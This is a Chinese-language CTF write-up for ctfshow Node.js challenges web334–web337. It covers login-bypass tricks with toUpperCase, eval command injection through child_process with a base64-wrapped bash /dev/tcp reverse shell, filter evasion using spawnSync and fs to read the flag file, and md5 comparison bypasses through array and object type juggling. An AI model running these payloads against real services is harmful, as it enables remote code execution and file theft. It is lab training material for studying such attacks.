### 【ctfshow】nodejs

#### web334            

login.js

```js
var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;
```

user.js

```js
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};
```

很显然，我们只需要绕过这里： `toUpperCase()是javascript中将小写转换成大写的函数。`

```js
return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
```

我们可以使用小写绕过：`ctfshow`



这里还有一个小trick，

```js
在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。
在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。
```

所以我们也可以写成这样：`ctfſhow`





#### web335

源码提示：

```
<!-- /?eval= -->
```

因此我们可以使用`nodejs`中的`eval()`进行命令执行

> Node.js中的`child_process.exec`调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造`require('child_process').exec('');`来进行调用。

![image-20230411173113969](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111731049.png)

这里我们选择反弹shell，

```bash
bash -i >& /dev/tcp/ip/port 0>&1
```

这一句的意思就是反弹shell，将输出与输入都重定型到指定ip的指定端口上面，

但是我们不能直接这样，我们需要先base64编码之后(注意加号要进行url编码为%2B)，然后使用echo输出，使用管道符|将输出作为`base64 -d`输入进行base64解密，最后再传给bash



这里我选择自己的服务器，首先监听9996端口，然后再execute

![image-20230411173813970](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111738001.png)

成功监听到了：

![image-20230411174043978](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111740011.png)

直接读flag





#### web336

我们了解到如下知识点：

> `__filename`：当前模块的文件名。 这是当前模块文件的已解析符号链接的绝对路径。
>
> `__dirname`：可以获得当前文件所在目录从盘符开始的全路径

![image-20230411181055933](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111810969.png)

有一种方法是使用`fs`模块去读取当前目录的文件名，然后通过方法去读取文件内容：

```js
require('fs').readdirSync('.')
```

![image-20230411182806500](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111828536.png)

```js
require('fs').readFileSync('fl001g.txt')
```

![image-20230411182941723](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111829758.png)



常规方法：这里过滤了`exec`，我们可以使用`spawn`

`nodejs`的`child_process`中可以使用 `exec`、`execSync`、`spawn`、`spawnSync`进行命令执行

当我们使用：

```js
require('child_process').spawnSync('ls')
```

![image-20230411183551070](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111835105.png)

发现，显示出 `object`，查询资料

![image-20230411183721508](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111837564.png)

返回的object里有个`stdout`属性，我们调用它，就可以当成字符串输出了：

![image-20230411183854636](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111838673.png)

然后我们去读文件：

```js
// require('child_process').spawnSync('cat fl001g.txt').stdout
```

如果这样读的话语法是错的，我们需要这样：

```js
require('child_process').spawnSync('cat',['fl001g.txt']).stdout
```

![image-20230411184039325](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111840361.png)



还有一种思路，通过定义变量，然后多个变量拼接：

![在这里插入图片描述](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111917247.png)





#### web337

```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;
```

关键点在这里：

```js
if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
```

这里可以使用数组绕过



```js
a = ['1']
b = 1
console.log(a + 'flag')
console.log(b + 'flag')
```

输出：

```
1flag
1flag
```

可以看到，`nodejs`中：如果**数组与字符串拼接**后输出、**数字与字符串拼接**后输出，结果是一样的

于是我们就有一种思路，可以a传入数组，然后b传入等值的数字：

```
a[]=1&b=1
```

![image-20230411191205702](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111912743.png)



还有一种方法，

`nodejs`中数组只能是数字索引，如果为非数字索引的话，相当于对象了。

```js
a = {'x': 1}
b = {'x': 2}
console.log(a + 'flag')
console.log(b + 'flag')

输出：
[object Object]flag
[object Object]flag
```

因此我们直接绕过：

```
a[x]=1&b[x]=2
```



